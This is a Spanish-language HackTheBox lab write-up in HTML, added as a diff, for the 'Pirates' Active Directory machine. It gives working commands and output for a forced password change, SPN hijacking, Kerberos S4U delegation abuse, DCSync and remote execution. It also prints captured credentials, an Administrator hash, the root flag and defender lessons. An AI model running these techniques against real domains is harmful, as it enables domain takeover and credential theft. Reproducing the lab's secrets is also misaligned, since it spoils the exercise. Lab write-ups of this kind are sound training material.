+      <strong>¿Qué es ForceChangePassword?</strong>
+      <p>El derecho extendido <code>User-Force-Change-Password</code> permite cambiar la contraseña de otro usuario sin conocer la actual. a.white_adm tiene KCD con Protocol Transition + WriteSPN sobre DC01$.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">$</span> rpcclient <span class="flag-opt">-U</span> <span class="str-c">'pirate.htb/a.white%E2nvAOKSz5Xz2MJu'</span> <span class="ip">10.129.244.95</span> <span class="flag-opt">-c</span> <span class="str-c">'setuserinfo2 a.white_adm 23 "Pirate2026!!"'</span>
+
+<span class="cmd">$</span> nxc ldap <span class="ip">10.129.244.95</span> <span class="flag-opt">-u</span> <span class="str-c">'a.white_adm'</span> <span class="flag-opt">-p</span> <span class="str-c">'Pirate2026!!'</span> <span class="flag-opt">-d</span> pirate.htb</div>
+    </div>
+    <div class="output-box"><div class="output-label">Output</div>LDAP  DC01  [+] pirate.htb\a.white_adm:Pirate2026!!</div>
+    <div class="interpret-box">
+      <strong>Interpretación</strong>
+      <p>Contraseña de a.white_adm cambiada exitosamente. Tiene atributos de delegación necesarios para el paso final.</p>
+    </div>
+  </div>
+
+  <!-- PASO 8 -->
+  <div class="step-box">
+    <div class="step-number">Paso 8 — KCD + Protocol Transition + SPN Hijacking → DCSync → root.txt</div>
+    <div class="why-box">
+      <strong>¿Cómo funciona KCD + SPN Hijacking?</strong>
+      <p><strong>KCD:</strong> a.white_adm tiene <code>msDS-AllowedToDelegateTo: HTTP/WEB01.pirate.htb</code> con T2A4D → S4U2Self para cualquier usuario + S4U2Proxy al SPN configurado.<br>
+      <strong>SPN Hijack:</strong> a.white_adm tiene WriteSPN sobre DC01$. Mover <code>HTTP/WEB01.pirate.htb</code> a DC01$ → el KDC cifra el ticket con la clave del DC01 → con <code>-altservice cifs/DC01.pirate.htb</code> el ticket es válido para CIFS en DC01 → DCSync.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># 1. Mover SPN HTTP/WEB01.pirate.htb: de WEB01$ → a DC01$</span>
+<span class="cmd">$</span> python3 -c <span class="str-c">"
+import ldap3
+conn = ldap3.Connection(
+    ldap3.Server('10.129.244.95', get_info=ldap3.ALL),
+    user='pirate.htb\\\\a.white_adm', password='Pirate2026!!',
+    authentication=ldap3.NTLM, auto_bind=True)
+conn.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb',
+    {'servicePrincipalName': [(ldap3.MODIFY_DELETE, ['HTTP/WEB01.pirate.htb','HTTP/WEB01'])]})
+conn.modify('CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb',
+    {'servicePrincipalName': [(ldap3.MODIFY_ADD, ['HTTP/WEB01.pirate.htb','HTTP/WEB01'])]})
+print('SPN movido OK')"</span>
+
+<span class="comment-c"># 2. Obtener TGT de a.white_adm</span>
+<span class="cmd">$</span> impacket-getTGT pirate.htb/a.white_adm:<span class="str-c">'Pirate2026!!'</span> <span class="flag-opt">-dc-ip</span> <span class="ip">10.129.244.95</span>
+<span class="cmd">$</span> export KRB5CCNAME=/home/kali/a.white_adm.ccache
+
+<span class="comment-c"># 3. S4U2Self + S4U2Proxy + altservice → cifs/DC01</span>
+<span class="cmd">$</span> impacket-getST pirate.htb/a.white_adm:<span class="str-c">'Pirate2026!!'</span> <span class="flag-opt">-spn</span> HTTP/WEB01.pirate.htb <span class="flag-opt">-impersonate</span> Administrator <span class="flag-opt">-altservice</span> cifs/DC01.pirate.htb <span class="flag-opt">-dc-ip</span> <span class="ip">10.129.244.95</span>
+
+<span class="comment-c"># 4. DCSync</span>
+<span class="cmd">$</span> export KRB5CCNAME=/home/kali/Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache
+<span class="cmd">$</span> impacket-secretsdump <span class="flag-opt">-k</span> <span class="flag-opt">-no-pass</span> pirate.htb/Administrator@DC01.pirate.htb <span class="flag-opt">-dc-ip</span> <span class="ip">10.129.244.95</span> <span class="flag-opt">-just-dc-user</span> Administrator</div>
+    </div>
+    <div class="output-box"><div class="output-label">Output</div>[*] Impersonating Administrator
+[*] Changing service from HTTP/WEB01.pirate.htb to cifs/DC01.pirate.htb
+[*] Saving ticket in Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<span style="color:var(--green);font-weight:700;">598295e78bd72d66f837997baf715171</span>:::</div>
+    <div class="interpret-box">
+      <strong>Interpretación</strong>
+      <p>DCSync exitoso. Hash NTLM del Administrator: <strong style="color:var(--green)">598295e78bd72d66f837997baf715171</strong>. Acceso total al dominio via pass-the-hash.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># Leer root.txt</span>
+<span class="cmd">$</span> proxychains -q impacket-wmiexec <span class="flag-opt">-k</span> <span class="flag-opt">-no-pass</span> pirate.htb/Administrator@DC01.pirate.htb <span class="flag-opt">-dc-ip</span> <span class="ip">10.129.244.95</span> <span class="str-c">'type C:\Users\Administrator\Desktop\root.txt'</span></div>
+    </div>
+    <div class="output-box" style="color:var(--green);font-size:1.1rem;font-weight:700;text-align:center;">153153258a8987f7afdc74f3eae0817e</div>
+  </div>
+</div>
+
+<!-- LECCIONES -->
+<div class="section">
+  <h2>📚 Lecciones Aprendidas</h2>
+  <div class="lessons-grid">
+    <div class="lesson-card attacker">
+      <h4>⚔ Para el Atacante</h4>
+      <ul>
+        <li><strong>gMSA hashes son estables en HTB</strong> — no rotan al resetear la máquina.</li>
+        <li><strong>Clock skew es el enemigo silencioso</strong> — <code>sudo ntpdate -u DC_IP</code> antes de cada operación Kerberos.</li>
+        <li><strong>-smb2support es crítico</strong> en ntlmrelayx con Windows Server 2019.</li>
+        <li><strong>-altservice en getST</strong> permite reescribir el SPN del ticket → acceso a cualquier servicio.</li>
+      </ul>
+    </div>
+    <div class="lesson-card defender">
+      <h4>🛡 Para el Defensor</h4>
+      <ul>
+        <li><strong>Auditar cuentas Pre-W2K</strong> y remediar contraseña = sAMAccountName.</li>
+        <li><strong>LDAP Signing y Channel Binding</strong> eliminan la mayoría de relay NTLM a LDAP.</li>
+        <li><strong>SMB Signing en todos los hosts</strong>, no solo el DC.</li>
+        <li><strong>LSA Protection (RunAsPPL)</strong> impide extracción de LSA secrets. No usar AutoLogon con texto plano.</li>
+        <li><strong>Auditar ForceChangePassword y WriteSPN</strong> con BloodHound regularmente.</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- MITRE -->
+<div class="section">
+  <h2>MITRE ATT&amp;CK</h2>
+  <table class="data-table">
+    <tr><th>ID</th><th>Técnica</th><th>Descripción</th></tr>
+    <tr><td><code>T1558.003</code></td><td>Kerberoasting / S4U</td><td>S4U2Self + S4U2Proxy para impersonación</td></tr>
+    <tr><td><code>T1134.001</code></td><td>Token Impersonation</td><td>RBCD + KCD con Protocol Transition</td></tr>
+    <tr><td><code>T1003.004</code></td><td>LSA Secrets</td><td>Dump de credenciales AutoLogon de WEB01</td></tr>
+    <tr><td><code>T1003.006</code></td><td>DCSync</td><td>Replicación AD para extraer hash Administrator</td></tr>
+    <tr><td><code>T1078.002</code></td><td>Domain Accounts</td><td>Uso de credenciales Pre-W2K y gMSA</td></tr>
+    <tr><td><code>T1090.001</code></td><td>Internal Proxy</td><td>Chisel SOCKS5 para alcanzar red interna</td></tr>
+  </table>
+</div>
+
+<!-- GLOSARIO -->
+<div class="section">
+  <h2>📖 Glosario</h2>
+  <div class="info-box">
+    <div class="glosario-item"><span class="glosario-term">gMSA</span><span class="glosario-def">Group Managed Service Account — cuenta cuya contraseña gestiona automáticamente el DC.</span></div>
+    <div class="glosario-item"><span class="glosario-term">NTLM Relay</span><span class="glosario-def">Ataque que intercepta auth NTLM y la retransmite a otro servicio como la víctima.</span></div>
+    <div class="glosario-item"><span class="glosario-term">RBCD</span><span class="glosario-def">Resource-Based Constrained Delegation — permite a un servicio actuar en nombre de usuarios.</span></div>
+    <div class="glosario-item"><span class="glosario-term">S4U2Self / S4U2Proxy</span><span class="glosario-def">Extensiones Kerberos para obtener tickets de servicio en nombre de cualquier usuario.</span></div>
+    <div class="glosario-item"><span class="glosario-term">KCD</span><span class="glosario-def">Kerberos Constrained Delegation — limita delegación a servicios específicos.</span></div>
+    <div class="glosario-item"><span class="glosario-term">SPN Hijacking</span><span class="glosario-def">Mover un SPN a otro objeto para que el KDC cifre el ticket con otra clave.</span></div>
+    <div class="glosario-item"><span class="glosario-term">DCSync</span><span class="glosario-def">Simula replicación de DC para extraer hashes NTLM de cualquier usuario del dominio.</span></div>
+    <div class="glosario-item"><span class="glosario-term">ForceChangePassword</span><span class="glosario-def">Derecho AD que permite cambiar la contraseña de otro usuario sin conocer la actual.</span></div>
+    <div class="glosario-item"><span class="glosario-term">Chisel</span><span class="glosario-def">Herramienta de tunneling TCP/UDP sobre HTTP para acceder a redes internas.</span></div>
+  </div>
+</div>
+
+</main>
+
+<!-- ═══ SIDEBAR ═══ -->
+<aside class="sidebar">
+  <div class="sidebar-card">
+    <h4>Ficha Técnica</h4>
+    <div class="meta-row"><span class="meta-label">Plataforma</span><span class="meta-value">HackTheBox</span></div>
+    <div class="meta-row"><span class="meta-label">Dificultad</span><span class="meta-value" style="color:var(--red)">Hard</span></div>
+    <div class="meta-row"><span class="meta-label">OS</span><span class="meta-value">Win Server 2019</span></div>
+    <div class="meta-row"><span class="meta-label">Tipo</span><span class="meta-value">Active Directory</span></div>
+    <div class="meta-row"><span class="meta-label">DC01</span><span class="meta-value">10.129.244.95</span></div>
+    <div class="meta-row"><span class="meta-label">WEB01</span><span class="meta-value">192.168.100.2</span></div>
+    <div class="meta-row"><span class="meta-label">Dominio</span><span class="meta-value">pirate.htb</span></div>
+    <div class="meta-row"><span class="meta-label">Fecha</span><span class="meta-value">2026-03-31</span></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Credenciales Obtenidas</h4>
+    <div class="meta-row"><span class="meta-label">pentest</span><span class="meta-value">p3nt3st2025!&amp;</span></div>
+    <div class="meta-row"><span class="meta-label">MS01$</span><span class="meta-value">ms01 (Pre-W2K)</span></div>
+    <div class="meta-row"><span class="meta-label">gMSA_ADCS_prod$</span><span class="meta-value">25c7f0eb…</span></div>
+    <div class="meta-row"><span class="meta-label">gMSA_ADFS_prod$</span><span class="meta-value">fd9ea7ac…</span></div>
+    <div class="meta-row"><span class="meta-label">AOOMPUJF$</span><span class="meta-value">5}m2Xd1+_jP5cg3</span></div>
+    <div class="meta-row"><span class="meta-label">a.white</span><span class="meta-value">E2nvAOKSz5Xz2MJu</span></div>
+    <div class="meta-row"><span class="meta-label">a.white_adm</span><span class="meta-value">Pirate2026!!</span></div>
+    <div class="meta-row"><span class="meta-label">Admin NT</span><span class="meta-value">598295e7…</span></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Timeline de Ataque</h4>
+    <div class="tl">
+      <div class="tli"><div class="tlt">Fase 1</div><div class="tln">Pre-W2K → TGT MS01$</div><div class="tld">Contraseña trivial ms01</div></div>
+      <div class="tli"><div class="tlt">Fase 2</div><div class="tln">gMSA Hash Extraction</div><div class="tld">2 hashes NTLM via LDAPS</div></div>
+      <div class="tli"><div class="tlt">Fase 3</div><div class="tln">WinRM DC01 + Chisel</div><div class="tld">Túnel SOCKS5 → red interna</div></div>
+      <div class="tli"><div class="tlt">Fase 4</div><div class="tln">NTLM Relay + RBCD</div><div class="tld">CVE-2019-1040, coerce WEB01</div></div>
+      <div class="tli"><div class="tlt">Fase 5</div><div class="tln">S4U2Proxy → Admin WEB01</div><div class="tld">user.txt ✓</div></div>
+      <div class="tli"><div class="tlt">Fase 6</div><div class="tln">LSA Dump</div><div class="tld">a.white:E2nvAOKSz5Xz2MJu</div></div>
+      <div class="tli"><div class="tlt">Fase 7</div><div class="tln">ForceChangePassword</div><div class="tld">a.white → a.white_adm</div></div>
+      <div class="tli"><div class="tlt">Fase 8</div><div class="tln">KCD + SPN Hijack</div><div class="tld">DCSync → root.txt ✓</div></div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Herramientas</h4>
+    <div class="meta-row"><span class="meta-label">Kerberos</span><span class="meta-value">getTGT, getST</span></div>
+    <div class="meta-row"><span class="meta-label">Enum AD</span><span class="meta-value">nxc, bloodhound</span></div>
+    <div class="meta-row"><span class="meta-label">NTLM Relay</span><span class="meta-value">ntlmrelayx</span></div>
+    <div class="meta-row"><span class="meta-label">Lateral</span><span class="meta-value">evil-winrm, wmiexec</span></div>
+    <div class="meta-row"><span class="meta-label">Tunnel</span><span class="meta-value">chisel, proxychains</span></div>
+    <div class="meta-row"><span class="meta-label">Creds</span><span class="meta-value">secretsdump, --lsa</span></div>
+    <div class="meta-row"><span class="meta-label">ACL</span><span class="meta-value">rpcclient, ldap3</span></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>MITRE ATT&amp;CK</h4>
+    <span class="mitre-tag">T1558.003</span>
+    <span class="mitre-tag">T1134.001</span>
+    <span class="mitre-tag">T1003.004</span>
+    <span class="mitre-tag">T1003.006</span>
+    <span class="mitre-tag">T1078.002</span>
+    <span class="mitre-tag">T1090.001</span>
+    <span class="mitre-tag">CVE-2019-1040</span>
+  </div>
+</aside>
+</div>
+
+<footer style="background:var(--card);border-top:1px solid var(--border);padding:1.5rem;text-align:center;margin-top:3rem;">
+  <p style="color:var(--text-muted);font-size:.82rem;">HTB · Pirates · Hard · Windows AD · 2026-03-31</p>
+</footer>
+
+<!-- Atom Orb Canvas -->
+<script>
+(function(){
+  var c=document.getElementById('atomOrb');if(!c)return;
+  var ctx=c.getContext('2d');if(!ctx)return;
+  function resize(){c.width=c.offsetWidth;c.height=c.offsetHeight;}
+  resize();window.addEventListener('resize',resize);
+  var t=(1+Math.sqrt(5))/2;
+  var baseV=[[-1,t,0],[1,t,0],[-1,-t,0],[1,-t,0],[0,-1,t],[0,1,t],[0,-1,-t],[0,1,-t],[t,0,-1],[t,0,1],[-t,0,-1],[-t,0,1]];
+  baseV=baseV.map(function(v){var l=Math.sqrt(v[0]*v[0]+v[1]*v[1]+v[2]*v[2]);return[v[0]/l,v[1]/l,v[2]/l];});
+  var faces=[[0,11,5],[0,5,1],[0,1,7],[0,7,10],[0,10,11],[1,5,9],[5,11,4],[11,10,2],[10,7,6],[7,1,8],[3,9,4],[3,4,2],[3,2,6],[3,6,8],[3,8,9],[4,9,5],[2,4,11],[6,2,10],[8,6,7],[9,8,1]];
+  function buildIco(detail,radius){
+    var verts=baseV.map(function(v){return v.slice();});
+    var f=faces.map(function(x){return x.slice();});
+    var mc={};
+    function gm(a,b){var k=Math.min(a,b)+'-'+Math.max(a,b);if(mc[k]!==undefined)return mc[k];var va=verts[a],vb=verts[b];var mx=(va[0]+vb[0])/2,my=(va[1]+vb[1])/2,mz=(va[2]+vb[2])/2;var l=Math.sqrt(mx*mx+my*my+mz*mz);verts.push([mx/l,my/l,mz/l]);mc[k]=verts.length-1;return mc[k];}
+    for(var d=0;d<detail;d++){var nf=[];for(var i=0;i<f.length;i++){var a=gm(f[i][0],f[i][1]),b=gm(f[i][1],f[i][2]),cc=gm(f[i][2],f[i][0]);nf.push([f[i][0],a,cc],[f[i][1],b,a],[f[i][2],cc,b],[a,b,cc]);}f=nf;}
+    var es=new Set(),edges=[];for(var i=0;i<f.length;i++){for(var j=0;j<3;j++){var a2=f[i][j],b2=f[i][(j+1)%3],key=Math.min(a2,b2)+'-'+Math.max(a2,b2);if(!es.has(key)){es.add(key);edges.push([a2,b2]);}}}
+    return{verts:verts.map(function(v){return[v[0]*radius,v[1]*radius,v[2]*radius];}),edges:edges};
+  }
+  var l1=buildIco(2,1),l2=buildIco(1,.72);
+  function ry(x,z,a){return[x*Math.cos(a)-z*Math.sin(a),x*Math.sin(a)+z*Math.cos(a)];}
+  function rx(y,z,a){return[y*Math.cos(a)-z*Math.sin(a),y*Math.sin(a)+z*Math.cos(a)];}
+  var ot=0;
+  function draw(){
+    requestAnimationFrame(draw);ot+=0.006;
+    var w=c.width,h=c.height;ctx.clearRect(0,0,w,h);
+    var cx=w/2,cy=h/2,R=Math.min(w,h)*.28;
+    var grd=ctx.createRadialGradient(cx,cy,R*.2,cx,cy,R*1.3);grd.addColorStop(0,'rgba(0,232,122,.08)');grd.addColorStop(1,'rgba(0,232,122,0)');ctx.beginPath();ctx.arc(cx,cy,R*1.3,0,Math.PI*2);ctx.fillStyle=grd;ctx.fill();
+    function drawL(layer,rm,xm,a){var r2=ot*rm,xr=ot*xm;ctx.beginPath();ctx.strokeStyle='rgba(0,232,122,'+a+')';ctx.lineWidth=.7;for(var i=0;i<layer.edges.length;i++){var e=layer.edges[i],va=layer.verts[e[0]],vb=layer.verts[e[1]];var p1=ry(va[0],va[2],r2),q1=rx(va[1],p1[1],xr);var p2=ry(vb[0],vb[2],r2),q2=rx(vb[1],p2[1],xr);ctx.moveTo(cx+p1[0]*R,cy+q1[0]*R);ctx.lineTo(cx+p2[0]*R,cy+q2[0]*R);}ctx.stroke();}
+    drawL(l1,.7,.36,.18);drawL(l2,-.5,.3,.08);
+    var oR=R*1.35;
+    function orbit(tX,tZ,ea){ctx.beginPath();ctx.strokeStyle='rgba(0,232,122,0.18)';ctx.lineWidth=.7;for(var i=0;i<=100;i++){var a=i/100*Math.PI*2,px=Math.cos(a)*oR,py=Math.sin(a)*oR*.3;var px2=px*Math.cos(tZ)-py*Math.sin(tZ),py2=px*Math.sin(tZ)+py*Math.cos(tZ);var py3=py2*Math.cos(tX)-Math.sin(a)*oR*.1*Math.sin(tX);if(i===0)ctx.moveTo(cx+px2,cy+py3);else ctx.lineTo(cx+px2,cy+py3);}ctx.stroke();
+    var ex=Math.cos(ea)*oR,ey=Math.sin(ea)*oR*.3;var ex2=ex*Math.cos(tZ)-ey*Math.sin(tZ),ey2=ex*Math.sin(tZ)+ey*Math.cos(tZ);var ey3=ey2*Math.cos(tX)-Math.sin(ea)*oR*.1*Math.sin(tX);ctx.beginPath();ctx.arc(cx+ex2,cy+ey3,3,0,Math.PI*2);ctx.fillStyle='rgba(0,232,122,0.12)';ctx.fill();ctx.beginPath();ctx.arc(cx+ex2,cy+ey3,1.8,0,Math.PI*2);ctx.fillStyle='rgba(0,232,122,0.5)';ctx.fill();}
+    orbit(0,.5,ot*2);orbit(.8,-.3,ot*2+Math.PI*.66);orbit(-.5,1.2,ot*2+Math.PI*1.33);
+    var pulse=.06+Math.sin(ot*2)*.03;var cg=ctx.createRadialGradient(cx,cy,0,cx,cy,R*.35);cg.addColorStop(0,'rgba(0,232,122,'+(pulse+.08)+')');cg.addColorStop(1,'rgba(0,232,122,0)');ctx.beginPath();ctx.arc(cx,cy,R*.35,0,Math.PI*2);ctx.fillStyle=cg;ctx.fill();
+    var tp=.65+Math.sin(ot*1.8)*.2;ctx.font=Math.round(R*.38)+'px Bebas Neue';ctx.textAlign='center';ctx.textBaseline='middle';ctx.shadowColor='rgba(0,232,122,.7)';ctx.shadowBlur=18+Math.sin(ot*2)*6;ctx.fillStyle='rgba(0,232,122,'+tp+')';ctx.fillText('YRD',cx,cy+2);ctx.shadowBlur=0;
+  }
+  draw();
+})();
+</script>
+
+</body>
+</html>
